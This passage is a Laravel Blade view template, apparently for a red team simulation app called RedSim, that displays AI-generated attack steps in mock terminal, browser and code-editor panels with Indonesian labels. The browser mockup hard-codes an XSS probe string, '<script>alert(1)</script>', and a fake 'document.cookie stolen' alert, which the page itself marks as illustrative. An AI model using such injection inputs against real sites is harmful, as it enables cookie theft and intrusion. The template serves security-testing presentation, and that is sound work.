@extends('layouts.app')

@section('title', 'Detail Simulasi — RedSim')
@section('header', 'Simulasi Serangan Red Team')
@section('subheader', 'Skenario: ' . $simulasi->nama_skenario)

@section('content')
<div class="max-w-5xl mx-auto pb-20" x-data="simulasiRedTeam()" x-init="init()">

    {{-- ===== HEADER BAR ===== --}}
    <div class="flex items-center justify-between mb-8 flex-wrap gap-3">
        <a href="{{ route('simulasi.index', $scan->id) }}"
           class="flex items-center gap-2 text-sm text-slate-400 hover:text-white transition-colors group">
            <svg class="w-4 h-4 group-hover:-translate-x-1 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"/>
            </svg>
            Kembali ke Daftar Skenario
        </a>

        <div class="flex items-center gap-3 flex-wrap">
            <span x-show="!isRunning && !isComplete && !isError"
                  class="px-3 py-1.5 rounded-lg text-xs font-medium bg-slate-800 text-slate-400 border border-slate-700">
                ⏸ Siap Dijalankan
            </span>
            <span x-show="isRunning"
                  class="px-3 py-1.5 rounded-lg text-xs font-medium bg-yellow-500/10 text-yellow-400 border border-yellow-500/20 animate-pulse">
                ⚡ Simulasi Berjalan...
            </span>
            <span x-show="isComplete && !isError"
                  class="px-3 py-1.5 rounded-lg text-xs font-medium bg-green-500/10 text-green-400 border border-green-500/20">
                ✓ Simulasi Selesai
            </span>
            <span x-show="isError"
                  class="px-3 py-1.5 rounded-lg text-xs font-medium bg-red-500/10 text-red-400 border border-red-500/20">
                ✗ Terjadi Kesalahan
            </span>

            <button @click="jalankanSimulasi()" x-show="!isRunning && !isComplete"
                    class="flex items-center gap-2 px-5 py-2.5 bg-red-600 hover:bg-red-500 text-white rounded-lg font-semibold text-sm transition-all shadow-[0_0_20px_rgba(220,38,38,0.4)] hover:shadow-[0_0_30px_rgba(220,38,38,0.6)] active:scale-95">
                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z"/>
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
                </svg>
                Jalankan Simulasi AI
            </button>
            <button @click="resetSimulasi()" x-show="isComplete || isError"
                    class="flex items-center gap-2 px-4 py-2.5 bg-slate-700 hover:bg-slate-600 text-white rounded-lg font-semibold text-sm transition-all">
                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/>
                </svg>
                Jalankan Ulang
            </button>
            <form method="POST" action="{{ route('simulasi.pdf', [$scan->id, $simulasi->id]) }}" x-show="isComplete" class="inline">
                @csrf
                <input type="hidden" name="hasilAI" :value="JSON.stringify(hasilAI)">
                <button type="submit"
                        class="flex items-center gap-2 px-4 py-2.5 bg-indigo-600 hover:bg-indigo-500 text-white rounded-lg font-semibold text-sm transition-all shadow-[0_0_15px_rgba(79,70,229,0.4)]">
                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 17h2a2 2 0 002-2v-4a2 2 0 00-2-2H5a2 2 0 00-2 2v4a2 2 0 002 2h2m2 4h6a2 2 0 002-2v-4a2 2 0 00-2-2H9a2 2 0 00-2 2v4a2 2 0 002 2zm8-12V5a2 2 0 00-2-2H9a2 2 0 00-2 2v4h10z"/>
                    </svg>
                    Cetak PDF Custom
                </button>
            </form>
        </div>
    </div>

    {{-- ===== INFO SKENARIO ===== --}}
    <div class="p-5 rounded-2xl border border-slate-800 bg-gradient-to-br from-slate-900 to-slate-950 mb-8 shadow-xl">
        <div class="flex items-start gap-4">
            <div class="p-3 bg-red-500/15 rounded-xl shrink-0 border border-red-500/20">
                <svg class="w-6 h-6 text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M13 10V3L4 14h7v7l9-11h-7z"/>
                </svg>
            </div>
            <div class="flex-1 min-w-0">
                <h2 class="text-base font-bold text-white mb-1">{{ $simulasi->nama_skenario }}</h2>
                <p class="text-sm text-slate-400 leading-relaxed">{{ $simulasi->narasi_eksekutif }}</p>
                <div class="mt-3 flex items-center gap-4 flex-wrap text-xs">
                    <span class="text-slate-500">Profil: <span class="text-cyan-400 font-medium">{{ $simulasi->profil_penyerang }}</span></span>
                    <span class="text-slate-500">Target: <span class="text-yellow-400 font-mono">{{ $scan->target }}</span></span>
                    <span class="text-slate-500">Kemungkinan:
                        <span class="font-bold {{ $simulasi->skor_kemungkinan >= 7 ? 'text-red-400' : ($simulasi->skor_kemungkinan >= 4 ? 'text-yellow-400' : 'text-green-400') }}">
                            {{ $simulasi->skor_kemungkinan }}/10
                        </span>
                    </span>
                    <span class="text-slate-500">Dampak:
                        <span class="font-bold {{ $simulasi->skor_dampak >= 7 ? 'text-red-400' : ($simulasi->skor_dampak >= 4 ? 'text-yellow-400' : 'text-green-400') }}">
                            {{ $simulasi->skor_dampak }}/10
                        </span>
                    </span>
                </div>
            </div>
        </div>
    </div>

    {{-- ===== PRINT HEADER ===== --}}
    <div class="print-header mb-6 p-4 border border-gray-300 rounded-lg">
        <h1 class="text-xl font-bold text-gray-900">Laporan Simulasi Serangan Red Team</h1>
        <div class="mt-2 text-sm text-gray-700">
            <p><strong>Target:</strong> {{ $scan->target }}</p>
            <p><strong>Skenario:</strong> {{ $simulasi->nama_skenario }}</p>
            <p><strong>Tanggal:</strong> {{ now()->format('d/m/Y H:i') }} WIB</p>
        </div>
    </div>

    {{-- ===== LOADING AI STATE ===== --}}
    <div x-show="isLoadingAI" class="flex flex-col items-center justify-center py-16 gap-4">
        <div class="flex gap-2">
            <div class="w-3 h-3 rounded-full bg-cyan-500 animate-bounce" style="animation-delay:0ms"></div>
            <div class="w-3 h-3 rounded-full bg-cyan-500 animate-bounce" style="animation-delay:150ms"></div>
            <div class="w-3 h-3 rounded-full bg-cyan-500 animate-bounce" style="animation-delay:300ms"></div>
        </div>
        <div class="text-cyan-400 text-sm font-semibold">AI Sedang Merancang Skenario Serangan...</div>
        <div class="text-slate-600 text-xs">Memproses data scan & membangun vektor serangan</div>
    </div>

    {{-- ===== ERROR STATE ===== --}}
    <div x-show="isError" class="p-5 rounded-xl border border-red-500/30 bg-red-500/5 mb-6">
        <div class="text-red-400 font-semibold mb-1">✗ SIMULASI GAGAL</div>
        <div class="text-red-300/80 text-sm" x-text="pesanError"></div>
        <div class="text-slate-500 text-xs mt-1">Coba lagi atau periksa konfigurasi API AI Anda.</div>
    </div>

    {{-- ===== IDLE STATE ===== --}}
    <div x-show="!isRunning && !isComplete && !isError && !isLoadingAI"
         class="flex flex-col items-center justify-center py-20 gap-4 text-center">
        <div class="w-20 h-20 rounded-full bg-red-500/10 border border-red-500/20 flex items-center justify-center mb-2">
            <svg class="w-10 h-10 text-red-400/60" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z"/>
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
            </svg>
        </div>
        <div class="text-slate-400 font-semibold">Siap Menjalankan Simulasi</div>
        <div class="text-slate-600 text-sm max-w-xs">Klik tombol <span class="text-red-400 font-medium">"Jalankan Simulasi AI"</span> di atas untuk memulai eksekusi skenario serangan</div>
    </div>

    {{-- ===== VERTICAL TIMELINE LANGKAH ===== --}}
    <div x-show="langkahSelesai.length > 0" id="timeline-section">

        <div class="flex items-center gap-3 mb-8">
            <div class="w-1 h-6 bg-gradient-to-b from-red-500 to-red-700 rounded-full"></div>
            <span class="text-sm text-slate-300 font-bold uppercase tracking-widest">Eksekusi Langkah Serangan</span>
            <span class="text-xs text-slate-600 font-mono" x-text="langkahSelesai.length + ' langkah'"></span>
        </div>

        {{-- Timeline wrapper --}}
        <div class="relative" id="timeline-steps">

            {{-- Garis timeline vertikal (background) --}}
            <div class="absolute left-[19px] top-0 bottom-0 w-px bg-gradient-to-b from-red-500/40 via-slate-700/60 to-transparent z-0 print-hide"></div>

            <template x-for="(langkah, idxL) in langkahSelesai" :key="idxL">
                <div class="relative pl-14 mb-10 last:mb-0 step-block"
                     :class="idxL === langkahSelesai.length - 1 && isRunning ? 'step-active' : ''">

                    {{-- ── Timeline Node ── --}}
                    <div class="absolute left-0 top-4 z-10 flex flex-col items-center">
                        <div class="w-10 h-10 rounded-full flex items-center justify-center text-xs font-bold border-2 transition-all duration-500"
                             :class="idxL < langkahSelesai.length - 1 || isComplete
                                 ? 'bg-red-600 border-red-400 text-white shadow-[0_0_14px_rgba(220,38,38,0.6)]'
                                 : (isRunning && idxL === langkahSelesai.length - 1
                                     ? 'bg-yellow-500/20 border-yellow-400 text-yellow-300 animate-pulse'
                                     : 'bg-slate-800 border-slate-600 text-slate-400')"
                             x-text="idxL + 1">
                        </div>
                        <div x-show="isRunning && idxL === langkahSelesai.length - 1"
                             class="w-2 h-2 rounded-full bg-yellow-400 animate-ping mt-1.5"></div>
                    </div>

                    {{-- ── Step Card ── --}}
                    <div class="relative rounded-2xl border overflow-hidden shadow-xl transition-all duration-500"
                         :class="isRunning && idxL === langkahSelesai.length - 1
                             ? 'border-yellow-500/30 shadow-[0_0_30px_rgba(234,179,8,0.08)]'
                             : 'border-slate-700/70'">

                        {{-- ── Ceklis Selesai (Kanan Bawah) ── --}}
                        <div x-show="idxL < langkahSelesai.length - 1 || (isComplete && idxL === langkahSelesai.length - 1)"
                             class="absolute bottom-4 right-4 w-8 h-8 rounded-full bg-green-500 border-2 border-green-400 flex items-center justify-center text-white z-20 shadow-[0_0_15px_rgba(34,197,94,0.6)]"
                             x-transition>
                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"/>
                            </svg>
                        </div>

                        {{-- Step Header --}}
                        <div class="flex items-center gap-3 px-5 py-3.5 bg-gradient-to-r from-[#161b22] to-[#1c2333] border-b border-slate-800">
                            <span class="text-[11px] px-2 py-0.5 rounded-md font-mono font-bold flex-shrink-0"
                                  :class="idxL < langkahSelesai.length - 1 || isComplete
                                      ? 'bg-red-500/20 border border-red-500/30 text-red-400'
                                      : 'bg-slate-700 border border-slate-600 text-slate-400'"
                                  x-text="'#' + (idxL + 1)">
                            </span>
                            <div class="flex-1 min-w-0">
                                <div class="text-sm font-bold text-white truncate" x-text="langkah.judul"></div>
                            </div>
                            <span class="text-[10px] text-purple-400/70 shrink-0 font-mono hidden sm:block" x-text="langkah.fase_attck"></span>
                            <span class="text-[10px] px-2 py-0.5 rounded-full border shrink-0"
                                  :class="{
                                      'bg-blue-500/10 border-blue-500/20 text-blue-400': langkah.tipe === 'recon',
                                      'bg-yellow-500/10 border-yellow-500/20 text-yellow-400': langkah.tipe === 'scan',
                                      'bg-red-500/10 border-red-500/20 text-red-400': langkah.tipe === 'exploit',
                                      'bg-orange-500/10 border-orange-500/20 text-orange-400': langkah.tipe === 'post_exploit',
                                      'bg-purple-500/10 border-purple-500/20 text-purple-400': langkah.tipe === 'exfil',
                                      'bg-slate-500/10 border-slate-500/20 text-slate-400': langkah.tipe === 'cleanup',
                                  }"
                                  x-text="langkah.tipe">
                            </span>
                            {{-- Badge evidence_type: tampil jika langkah adalah skenario hipotetis --}}
                            <span x-show="langkah.evidence_type === 'generated_scenario'"
                                  class="text-[9px] px-2 py-0.5 rounded-full border bg-amber-500/10 border-amber-500/30 text-amber-400 shrink-0 font-semibold">
                                ⚠ Skenario Ilustratif
                            </span>
                            <span x-show="langkah.evidence_type === 'verified_raw'"
                                  class="text-[9px] px-2 py-0.5 rounded-full border bg-green-500/10 border-green-500/30 text-green-400 shrink-0 font-semibold">
                                ✓ Berbasis Data Scan
                            </span>
                            <div x-show="isRunning && idxL === langkahSelesai.length - 1"
                                 class="w-2 h-2 rounded-full bg-yellow-400 animate-pulse shrink-0"></div>
                            <div x-show="!(isRunning && idxL === langkahSelesai.length - 1)"
                                 class="w-2 h-2 rounded-full bg-green-500/50 shrink-0"></div>
                        </div>

                        {{-- ── Komentar Operator ── --}}
                        <div class="px-5 py-2.5 bg-[#0d1117]/60 border-b border-slate-800/50 flex items-start gap-2">
                            <span class="text-slate-600 font-mono text-xs shrink-0 mt-0.5">#</span>
                            <span class="text-slate-500 text-xs italic font-mono leading-relaxed" x-text="langkah.komentar_operator"></span>
                        </div>

                        {{-- ── Konten Adaptif ── --}}
                        <div class="bg-[#0d1117]">

                            {{-- KASUS A: Terminal (command/output) - default --}}
                            <template x-if="langkah.baris_terminal && langkah.baris_terminal.length > 0 && !isBrowserStep(langkah) && !isScriptStep(langkah)">
                                <div class="grid grid-cols-1 lg:grid-cols-2 divide-y lg:divide-y-0 lg:divide-x divide-slate-800">

                                    {{-- Panel Kiri: Terminal --}}
                                    <div class="p-4">
                                        <div class="sim-terminal-container rounded-lg overflow-hidden shadow-lg">
                                            <div class="sim-terminal-toolbar flex items-center px-3 py-2">
                                                <div class="flex gap-1.5">
                                                    <button class="sim-btn sim-btn-red"></button>
                                                    <button class="sim-btn"></button>
                                                    <button class="sim-btn"></button>
                                                </div>
                                                <p class="sim-terminal-user ml-3 text-xs"
                                                   x-text="'redsim@kali: ' + (langkah.tipe === 'recon' ? '~/recon' : (langkah.tipe === 'exploit' ? '~/exploit' : '~'))">
                                                </p>
                                            </div>
                                            <div class="sim-terminal-body font-mono text-xs leading-relaxed p-3 overflow-y-auto custom-scrollbar"
                                                 style="min-height: 200px; max-height: 340px;"
                                                 :id="'term-body-' + idxL">

                                                <div class="sim-terminal-prompt mb-2">
                                                    <span class="sim-terminal-user-text">redsim@kali:</span>
                                                    <span class="sim-terminal-location">~</span>
                                                    <span class="sim-terminal-bling">$</span>
                                                    <span class="sim-terminal-cursor" x-show="isRunning && idxL === langkahSelesai.length - 1"></span>
                                                </div>

                                                <template x-for="(baris, idxB) in langkah.baris_terminal" :key="idxB">
                                                    <div class="mb-0.5 break-all leading-5"
                                                         :class="{
                                                             'term-output': baris.tipe === 'output',
                                                             'term-success': baris.tipe === 'success',
                                                             'term-error': baris.tipe === 'error',
                                                             'term-warning': baris.tipe === 'warning',
                                                             'term-info': baris.tipe === 'info',
                                                             'term-command': baris.tipe === 'command',
                                                             'term-prompt-line': baris.tipe === 'prompt',
                                                         }">
                                                        <span x-show="baris.tipe === 'command'" class="select-none">
                                                            <span class="sim-terminal-user-text">redsim@kali</span><span class="text-slate-500">:~$ </span>
                                                        </span>
                                                        <span x-text="baris.teks"></span>
                                                    </div>
                                                </template>

                                                <div x-show="isTyping && idxL === langkahSelesai.length - 1" class="mb-0.5 leading-5">
                                                    <span class="sim-terminal-user-text select-none">redsim@kali</span>
                                                    <span class="text-slate-500 select-none">:~$ </span>
                                                    <span class="text-white" x-text="sedangDiketik"></span>
                                                    <span class="inline-block w-[6px] h-[12px] bg-cyan-400 align-bottom animate-pulse ml-px"></span>
                                                </div>
                                            </div>
                                        </div>
                                    </div>

                                    {{-- Panel Kanan: Penjelasan --}}
                                    <div class="p-5 flex flex-col gap-3 bg-[#10131a]">
                                        <div class="text-[10px] text-slate-500 uppercase tracking-widest font-semibold flex items-center gap-1.5">
                                            <svg class="w-3 h-3 text-cyan-500" fill="currentColor" viewBox="0 0 20 20">
                                                <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd"/>
                                            </svg>
                                            Penjelasan Langkah
                                        </div>
                                        <div x-show="langkah.fase_attck" class="flex items-center gap-2">
                                            <span class="text-[10px] text-slate-600">MITRE ATT&amp;CK:</span>
                                            <span class="text-[10px] font-mono text-purple-400 bg-purple-500/10 px-2 py-0.5 rounded border border-purple-500/20" x-text="langkah.fase_attck"></span>
                                        </div>
                                        <div class="p-3 rounded-xl bg-slate-800/40 border border-slate-700/50 text-xs text-slate-400 leading-relaxed">
                                            <span class="text-slate-500">Tipe: </span>
                                            <span class="font-semibold"
                                                  :class="{
                                                      'text-blue-400': langkah.tipe === 'recon',
                                                      'text-yellow-400': langkah.tipe === 'scan',
                                                      'text-red-400': langkah.tipe === 'exploit',
                                                      'text-orange-400': langkah.tipe === 'post_exploit',
                                                      'text-purple-400': langkah.tipe === 'exfil',
                                                      'text-slate-400': langkah.tipe === 'cleanup',
                                                  }"
                                                  x-text="tipeLabelMap[langkah.tipe] ?? langkah.tipe">
                                            </span>
                                        </div>
                                        <div x-show="langkah.temuan_kunci" class="mt-auto p-3 rounded-xl bg-green-900/20 border border-green-500/20">
                                            <div class="text-[10px] text-green-400 font-semibold uppercase tracking-wider mb-1">✓ Temuan Kunci</div>
                                            <div class="text-xs text-green-300/80 leading-relaxed" x-text="langkah.temuan_kunci"></div>
                                        </div>
                                    </div>
                                </div>
                            </template>

                            {{-- KASUS B: Browser/Web step (XSS, CSRF, phishing, dll.) --}}
                            <template x-if="isBrowserStep(langkah)">
                                <div class="grid grid-cols-1 lg:grid-cols-2 divide-y lg:divide-y-0 lg:divide-x divide-slate-800">

                                    {{-- Panel Kiri: Browser simulasi --}}
                                    <div class="p-5 flex flex-col items-center justify-center bg-[#0d1117]">
                                        <div class="sim-browser rounded-lg overflow-hidden w-full max-w-sm shadow-2xl">
                                            <div class="sim-tabs-head flex justify-between items-end px-3 pt-1">
                                                <div class="flex items-end">
                                                    <div class="sim-tab-open px-3 py-1.5 rounded-t-lg text-xs text-white flex items-center gap-2">
                                                        <svg class="w-3 h-3 text-red-400" fill="currentColor" viewBox="0 0 20 20">
                                                            <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"/>
                                                        </svg>
                                                        <span x-text="langkah.judul ? langkah.judul.split(' ').slice(0,2).join(' ') : 'Target'"></span>
                                                        <span class="text-slate-400 text-[9px] ml-1">✕</span>
                                                    </div>
                                                </div>
                                                <div class="flex">
                                                    <button class="sim-window-btn text-xs text-slate-300 px-2">－</button>
                                                    <button class="sim-window-btn text-xs text-slate-300 px-2">□</button>
                                                    <button class="sim-window-btn-close text-xs text-white px-2">✕</button>
                                                </div>
                                            </div>
                                            <div class="sim-head-browser flex items-center gap-1.5 px-3 py-2">
                                                <button class="text-slate-400 text-sm w-6 h-6 flex items-center justify-center hover:bg-slate-600 rounded-full transition-colors">←</button>
                                                <button class="text-slate-600 text-sm w-6 h-6 flex items-center justify-center opacity-40" disabled>→</button>
                                                <div class="flex-1 bg-[#3b3b3b] rounded-full px-3 py-1 flex items-center gap-2">
                                                    <svg class="w-3 h-3 text-red-400 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
                                                    </svg>
                                                    <span class="text-slate-300 text-[10px] font-mono truncate" x-text="getBrowserUrl(langkah)"></span>
                                                </div>
                                                <button class="text-slate-400 text-sm px-1">⋮</button>
                                            </div>
                                            <div class="bg-white min-h-[160px] p-4 relative overflow-hidden">
                                                <div x-show="langkah.tipe === 'exploit'" class="absolute inset-0 bg-white/95 flex flex-col items-center justify-center p-4 gap-3">
                                                    <div class="w-full max-w-[220px] border border-gray-300 rounded shadow-lg bg-white overflow-hidden">
                                                        <div class="bg-[#f0f0f0] px-3 py-1.5 flex items-center gap-2 border-b border-gray-300">
                                                            <span class="text-[9px] text-gray-500">javascript alert dari</span>
                                                            <span class="text-[9px] text-gray-700 font-medium truncate" x-text="getBrowserUrl(langkah)"></span>
                                                        </div>
                                                        <div class="p-3 flex flex-col items-center gap-3">
                                                            <div class="w-8 h-8 rounded-full bg-yellow-100 flex items-center justify-center">
                                                                <span class="text-yellow-600 text-lg">⚠</span>
                                                            </div>
                                                            <p class="text-[10px] text-gray-700 text-center font-mono">XSS Payload Executed!<br><span class="text-red-600">document.cookie stolen</span></p>
                                                            <button class="px-4 py-1 bg-[#e0e0e0] border border-gray-400 rounded text-[10px] text-gray-700 hover:bg-gray-200">OK</button>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div x-show="langkah.tipe !== 'exploit'" class="space-y-2">
                                                    <div class="h-2 bg-gray-200 rounded w-3/4"></div>
                                                    <div class="h-2 bg-gray-200 rounded w-1/2"></div>
                                                    <div class="mt-3 border border-red-300 rounded p-2 bg-red-50">
                                                        <div class="text-[9px] text-red-600 font-semibold">⚠ Input Tidak Aman Terdeteksi</div>
                                                        <div class="text-[9px] text-gray-500 mt-1 font-mono">&lt;script&gt;alert(1)&lt;/script&gt;</div>
                                                    </div>
                                                    <div class="h-2 bg-gray-200 rounded w-2/3"></div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>

                                    {{-- Panel Kanan: Penjelasan --}}
                                    <div class="p-5 flex flex-col gap-3 bg-[#10131a]">
                                        <div class="text-[10px] text-slate-500 uppercase tracking-widest font-semibold flex items-center gap-1.5">
                                            <svg class="w-3 h-3 text-cyan-500" fill="currentColor" viewBox="0 0 20 20">
                                                <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd"/>
                                            </svg>
                                            Penjelasan Langkah
                                        </div>
                                        <div class="flex items-center gap-2">
                                            <span class="text-[10px] text-slate-600">MITRE ATT&amp;CK:</span>
                                            <span class="text-[10px] font-mono text-purple-400 bg-purple-500/10 px-2 py-0.5 rounded border border-purple-500/20" x-text="langkah.fase_attck"></span>
                                        </div>
                                        <div class="p-3 rounded-xl bg-orange-900/10 border border-orange-500/20 text-xs text-orange-300/80 leading-relaxed">
                                            <span class="text-orange-400 font-semibold block text-[10px] mb-1">🌐 Serangan via Browser</span>
                                            Langkah ini menggambarkan <strong>skenario hipotetis</strong> serangan yang melibatkan tampilan web. Visualisasi di kiri adalah ilustrasi — bukan bukti eksploitasi nyata.
                                        </div>
                                        <div x-show="langkah.temuan_kunci" class="mt-auto p-3 rounded-xl bg-green-900/20 border border-green-500/20">
                                            <div class="text-[10px] text-green-400 font-semibold uppercase tracking-wider mb-1">✓ Temuan Kunci</div>
                                            <div class="text-xs text-green-300/80 leading-relaxed" x-text="langkah.temuan_kunci"></div>
                                        </div>
                                    </div>
                                </div>
                            </template>

                            {{-- KASUS C: Script/Code step --}}
                            <template x-if="isScriptStep(langkah)">
                                <div class="grid grid-cols-1 lg:grid-cols-2 divide-y lg:divide-y-0 lg:divide-x divide-slate-800">

                                    {{-- Panel Kiri: Code Editor --}}
                                    <div class="p-4 flex flex-col items-center justify-center bg-[#0d1117]">
                                        <div class="vscode-card w-full max-w-sm">
                                            <div class="window-bar">
                                                <div class="window-buttons">
                                                    <span class="btn close"></span>
                                                    <span class="btn minimize"></span>
                                                    <span class="btn maximize"></span>
                                                </div>
                                                <div class="window-title" x-text="(langkah.tipe === 'exfil' ? 'exfil' : 'payload') + '.py - Visual Studio Code'"></div>
                                            </div>
                                            <div class="tab-bar">
                                                <div class="tab active" x-text="langkah.tipe === 'exfil' ? 'exfil.py' : 'payload.py'"></div>
                                                <div class="tab">utils.py</div>
                                            </div>
                                            <div class="editor-container">
                                                <div class="sidebar"><div class="icon"></div></div>
                                                <div class="editor">
                                                    <div class="line-numbers">
                                                        <template x-for="n in 15" :key="n"><span x-text="n"></span></template>
                                                    </div>
                                                    <div class="code-content">
                                                        <pre><code x-text="getScriptPreview(langkah)"></code></pre>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="status-bar">
                                                <span class="status-item">Ln 1, Col 1</span>
                                                <span class="status-item">UTF-8</span>
                                                <span class="status-item">Python</span>
                                            </div>
                                        </div>
                                    </div>

                                    {{-- Panel Kanan: Penjelasan --}}
                                    <div class="p-5 flex flex-col gap-3 bg-[#10131a]">
                                        <div class="text-[10px] text-slate-500 uppercase tracking-widest font-semibold flex items-center gap-1.5">
                                            <svg class="w-3 h-3 text-cyan-500" fill="currentColor" viewBox="0 0 20 20">
                                                <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd"/>
                                            </svg>
                                            Penjelasan Langkah
                                        </div>
                                        <div class="flex items-center gap-2">
                                            <span class="text-[10px] text-slate-600">MITRE ATT&amp;CK:</span>
                                            <span class="text-[10px] font-mono text-purple-400 bg-purple-500/10 px-2 py-0.5 rounded border border-purple-500/20" x-text="langkah.fase_attck"></span>
                                        </div>
                                        <div class="p-3 rounded-xl bg-green-900/10 border border-green-500/20 text-xs text-green-300/80 leading-relaxed">
                                            <span class="text-green-400 font-semibold block text-[10px] mb-1">📝 Pembuatan Script/Payload</span>
                                            Langkah ini melibatkan pembuatan atau penggunaan kode/script sebagai bagian dari serangan.
                                        </div>
                                        <div x-show="langkah.temuan_kunci" class="mt-auto p-3 rounded-xl bg-green-900/20 border border-green-500/20">
                                            <div class="text-[10px] text-green-400 font-semibold uppercase tracking-wider mb-1">✓ Temuan Kunci</div>
                                            <div class="text-xs text-green-300/80 leading-relaxed" x-text="langkah.temuan_kunci"></div>
                                        </div>
                                    </div>
                                </div>
                            </template>

                        </div>
                    </div>
                </div>
            </template>

            {{-- Panel Selesai --}}
            <div x-show="isComplete && !isError"
                 x-transition:enter="transition ease-out duration-700"
                 x-transition:enter-start="opacity-0 scale-95"
                 x-transition:enter-end="opacity-100 scale-100"
                 class="relative pl-14">
                <div class="absolute left-0 top-4 w-10 h-10 rounded-full bg-green-600 border-2 border-green-400 flex items-center justify-center text-white text-lg shadow-[0_0_20px_rgba(34,197,94,0.5)]">✓</div>
            <div class="p-5 rounded-2xl border border-green-500/20 bg-green-900/10 flex items-start gap-4">
                    <div>
                        <div class="text-green-400 font-bold text-sm">SIMULASI SELESAI</div>
                        <div class="text-slate-500 text-xs mt-1">Semua <span class="text-white font-semibold" x-text="langkahSelesai.length"></span> langkah selesai dianalisis oleh AI</div>
                        <div class="mt-2 px-3 py-2 rounded-lg bg-amber-500/10 border border-amber-500/20 text-amber-300 text-xs">
                            ⚠ <strong>Perhatian:</strong> Langkah bertanda <span class="bg-amber-500/10 border border-amber-500/30 text-amber-400 px-1 rounded text-[9px] font-semibold">⚠ Skenario Ilustratif</span> merupakan skenario hipotetis yang disusun AI berdasarkan temuan scan — bukan hasil eksploitasi nyata.
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    {{-- ===== ANALISIS AI (post-simulation) ===== --}}
    <div x-show="isComplete && hasilAI"
         x-transition:enter="transition ease-out duration-700"
         x-transition:enter-start="opacity-0 translate-y-4"
         x-transition:enter-end="opacity-100 translate-y-0"
         style="display:none;"
         class="mt-12 space-y-5">

        <div class="flex items-center gap-3">
            <div class="w-1 h-6 bg-gradient-to-b from-cyan-500 to-blue-600 rounded-full"></div>
            <span class="text-sm text-slate-300 font-bold uppercase tracking-widest">Analisis AI — Hasil Simulasi</span>
        </div>

        <div class="p-6 rounded-2xl border border-slate-700 bg-gradient-to-br from-slate-900 to-[#0d1117] shadow-xl">
            <div class="mb-5">
                <div class="text-xs text-slate-500 uppercase tracking-wider mb-2">Ringkasan Simulasi</div>
                <p class="text-sm text-slate-300 leading-relaxed" x-text="hasilAI?.ringkasan_simulasi"></p>
            </div>
            <div class="mb-5 p-4 rounded-xl bg-red-500/5 border border-red-500/20">
                <div class="text-xs text-red-400 uppercase tracking-wider mb-2 flex items-center gap-1.5">
                    <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/>
                    </svg>
                    Analisis Dampak
                </div>
                <p class="text-sm text-slate-300 leading-relaxed" x-text="hasilAI?.analisis_dampak"></p>
            </div>
            <div class="grid grid-cols-2 gap-3 mb-5">
                <div class="p-3 rounded-xl bg-slate-800/50 border border-slate-700">
                    <div class="text-xs text-slate-500 mb-1">Vektor Serangan Utama</div>
                    <div class="text-sm text-orange-400 font-medium" x-text="hasilAI?.vektor_serangan_utama ?? '-'"></div>
                </div>
                <div class="p-3 rounded-xl bg-slate-800/50 border border-slate-700">
                    <div class="text-xs text-slate-500 mb-1">Tingkat Kesulitan</div>
                    <div class="text-sm font-bold uppercase"
                         :class="{
